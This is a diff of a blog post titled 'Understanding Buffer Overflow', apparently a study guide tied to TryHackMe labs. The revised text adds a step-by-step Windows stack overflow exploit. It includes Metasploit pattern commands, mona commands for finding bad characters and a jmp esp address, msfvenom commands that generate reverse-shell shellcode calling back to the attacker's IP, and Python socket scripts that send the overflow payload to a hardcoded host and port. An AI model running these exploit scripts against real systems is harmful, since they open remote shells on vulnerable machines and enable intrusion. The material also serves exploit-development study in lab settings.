@@ -1,8 +1,7 @@
 ---
-
-layout: post
-title: "Understanding Buffer Overflow"
-date: 2024-08-08
+layout: post  
+title: "Understanding Buffer Overflow"  
+date: 2024-08-08  
 ---
 
 ## Table of Contents
@@ -32,7 +31,7 @@ date: 2024-08-08
 
 ## Introduction to Buffer Overflow
 
-Buffer overflow vulnerabilities occur when an application writes more data to a buffer than it can hold. This guide covers the basics of buffer overflow, identifying vulnerable programs, crafting exploits, and advanced techniques for effective exploitation.
+Buffer overflow vulnerabilities occur when an application writes more data to a buffer than it can hold. This guide covers the basics of buffer overflow, identifying vulnerable programs, crafting exploits, and advanced techniques for effective exploitation, with practical examples and step-by-step instructions.
 
 ### What is Buffer Overflow?
 
@@ -44,7 +43,7 @@ Understanding how memory is structured and managed in applications is crucial fo
 
 ### Understanding Memory Layout
 
-Buffers are regions of memory storage. In a buffer overflow, excessive data can overwrite adjacent memory, leading to unpredictable behavior or controlled exploitation. 
+Buffers are regions of memory storage. In a buffer overflow, excessive data can overwrite adjacent memory, leading to unpredictable behavior or controlled exploitation.
 
 To understand how a buffer overflow works, let's break down the memory layout and the process of overwriting a buffer to control the Instruction Pointer (EIP).
 
@@ -175,42 +174,133 @@ Once a vulnerability is identified, the next step is to craft an exploit. This i
 ### Crafting the Exploit
 
 #### Finding the Offset:
-- Use tools like `msf-pattern_create` and `msf-pattern_offset` to determine the exact offset where the overflow occurs.
-- Example:
+
+To accurately overwrite the EIP, the first step is finding the offset where the overflow occurs. This can be done using pattern creation and pattern offset tools.
+
+**Example Command Sequence**:
 
 ```bash
-msf-pattern_create -l 2500
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700
 ```
 
-- Inject the pattern into the application and note the value in the instruction pointer (EIP).
-- Example:
+Inject the generated pattern into the application and observe the EIP value.
 
 ```bash
-msf-pattern_offset -q [EIP Value]
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q [EIP Value]
 ```
 
-#### Injecting Shellcode:
-- After determining the offset, create a payload that includes shellcode to be executed.
-- Example shellcode generation:
+This gives you the exact offset. For example, if the offset is `146`, this means that 146 bytes of input will reach the saved EIP.
+
+#### Control the EIP:
+
+Use a simple script to confirm that the EIP is overwritten at the correct offset. This script will crash the application and verify that `BBBB` (hex: `42424242`) replaces the EIP.
+
+**Python Script**:
+
+```python
+import socket
+
+ip = "172.16.2.125"
+port = 31337
+
+offset = 146
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending buffer to crash the application...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+Running this script should result in the EIP being overwritten with `42424242`, confirming the offset.
+
+#### Bad Character Check:
+
+Identifying bad characters is critical before generating shellcode. Bad characters can terminate strings or otherwise disrupt the execution of your payload. Start by generating a full byte array:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=[Your IP] LPORT=4444 -f c
+!mona bytearray -b "\x00"
 ```
 
-### Using Exploit Development Tools
+Send this byte array and compare
 
-#### Immunity Debugger:
-- A powerful tool for analyzing and exploiting buffer overflows on Windows applications.
-- Set breakpoints, analyze memory, and craft payloads.
-
-#### Mona Script:
-- Use the Mona script in Immunity Debugger to automate common tasks in exploit development.
-- Example: Finding jump points.
+ it with the in-memory copy to find bad characters:
 
 ```bash
-!mona modules
-!mona jmp -r esp
+!mona compare -f C:\Path\To\ByteArray.bin -a [Address]
 ```
+
+Continue excluding bad characters until none remain. For example, if `\x00` and `\x0a` are bad, regenerate the byte array excluding these:
+
+```bash
+!mona bytearray -b "\x00\x0a"
+```
+
+#### Find the Jump Address:
+
+Identify an address in the application where a `jmp esp` instruction exists that is free from Address Space Layout Randomization (ASLR). 
+
+```bash
+!mona jmp -r esp -cpb "\x00\x0a"
+```
+
+Pick a suitable address (e.g., `0x080414C3`) and use it in little-endian format (`\xc3\x14\x04\x08`).
+
+### Injecting Shellcode:
+
+Generate shellcode using `msfvenom`, excluding identified bad characters:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=[Your IP] LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
+```
+
+Inject this shellcode into your payload:
+
+**Python Script with Shellcode**:
+
+```python
+import socket
+
+ip = "172.16.2.125"
+port = 31337
+
+offset = 146
+overflow = "A" * offset
+retn = "\xc3\x14\x04\x08"  # Address of jmp esp
+padding = "\x90" * 16  # NOP sled
+payload = (
+"\xbd\xc6\x4a\xb9\xb1\xdb\xde\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+"\x52\x31\x68\x12\x83\xc0\x04\x03\xae\x44\x5b\x44\xd2\xb1\x19"
+"\xa7\x2a\x42\x7e\x21\xcf\x73\xbe\x55\x84\x24\x0e\x1d\xc8\xc8"
+...  # Truncated for brevity
+)
+postfix = ""
+
+buffer = overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending malicious payload...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+Running this script should pop a shell on the vulnerable application.
 
 ## Practical Example
 
@@ -218,50 +308,34 @@ To better understand buffer overflow exploitation, here is a step-by-step guide 
 
 ### Step-by-Step Guide
 
-**Vulnerable Application**: `chatserver.exe`
+**Vulnerable Application**: For educational purposes, a hypothetical vulnerable application similar to the one used on TryHackMe.
 
 #### Step 1: Analyze the Application
 
-- Run `nmap` to identify open ports.
-- Connect using `netcat` or `telnet`.
+- Use tools like `nmap` to identify open ports and services.
+- Connect to the service using `netcat` or `telnet` and test for inputs.
 
 #### Step 2: Identify the Vulnerability
 
-- Send excessive input (also known as fuzzing) to the application and monitor for crashes.
+- Perform fuzzing by sending excessive input to the application and monitor for crashes.
 
 #### Step 3: Determine the Offset
 
-- Use `msf-pattern_create` to generate a unique pattern.
-- Inject the pattern and note the EIP value.
-- Use `msf-pattern_offset` to find the offset.
+- Use `pattern_create.rb` and `pattern_offset.rb` to find the exact offset where the overflow occurs.
 
 #### Step 4: Craft the Exploit
 
-- Generate shellcode using `msfvenom`.
-- Craft a Python script to send the payload.
+- Generate shellcode with `msfvenom`, excluding bad characters.
+- Use a Python script to send the crafted payload, including the shellcode.
 
-**Python Script**:
+#### Step 5: Test on Local Box
 
-```python
-import socket
+- Test your payload on a local instance of the vulnerable application before trying on the remote target (e.g., a TryHackMe box).
 
-target_ip = "192.168.1.100"
-target_port = 9999
-offset = 2012
-overflow = "A" * offset
-retn = "\xF3\x12\x17\x31"  # Address of a jump instruction
-padding = "\x90" * 16  # NOP sled
-payload = (b"\xda\xc4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52\xba"
-           b"\xf6\xc6\x85\xea\x31\x55\x17\x03\x55\x17\x83\xc5"
-           ...  # truncated shellcode for brevity
-           b"\x90\x90")  # Adjust shellcode to your needs
+**Shellcode Example for Remote Exploitation**:
 
-buffer = overflow.encode() + retn.encode() + padding.encode() + payload
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((target_ip, target_port))
-s.send(buffer)
-s.close()
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=[VPN IP] LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
 ```
 
 ## Advanced Techniques
@@ -311,8 +385,8 @@ Below is a list of commands and their descriptions used in buffer overflow explo
 | Command                  | Description                                                |
 |--------------------------|------------------------------------------------------------|
 | nmap                     | Network scanner to discover open ports and services.       |
-| msf-pattern_create       | Creates a unique pattern to identify buffer overflow offset.|
-| msf-pattern_offset       | Finds the offset using the EIP value.                      |
+| pattern_create.rb        | Creates a unique pattern to identify buffer overflow offset.|
+| pattern_offset.rb        | Finds the offset using the EIP value.                      |
 | msfvenom                 | Generates shellcode for various payloads.                  |
 | Immunity Debugger        | Debugger for Windows applications.                         |
 | GDB                      | Debugger for Linux applications.                           |
